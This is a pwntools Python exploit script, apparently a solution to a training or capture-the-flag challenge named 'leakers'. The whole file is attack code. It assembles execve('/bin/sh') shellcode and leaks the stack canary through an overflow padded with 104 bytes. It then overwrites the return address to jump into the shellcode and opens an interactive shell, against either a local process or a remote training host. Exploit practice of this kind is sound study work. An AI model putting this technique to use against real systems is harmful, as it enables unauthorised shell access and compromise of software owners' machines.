from pwn import *

CODE = '''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
mov rsi, rdx
mov rdx, rdx
mov rax, 0x3b
syscall
nop
'''

ELF('./leakers')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2010)
else:
    r = process('./leakers')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')

shellcode_1 = asm(CODE,arch="amd64", bits='64')
nop_sled = b"\x90"
where_to_jump = p64(0x404080) 

input('press a key..')
r.send(shellcode_1)
r.recvline()
r.sendline(nop_sled*104)
r.recv()
canary = r.recv()
canary = canary[-10:]
canary =  b"\x00" + canary
canary = canary[:8]
print("Canary leaked! %s" % canary.hex())
shellcode_2 = nop_sled*104 + canary + nop_sled*8 +  where_to_jump
r.send(shellcode_2)
r.interactive()
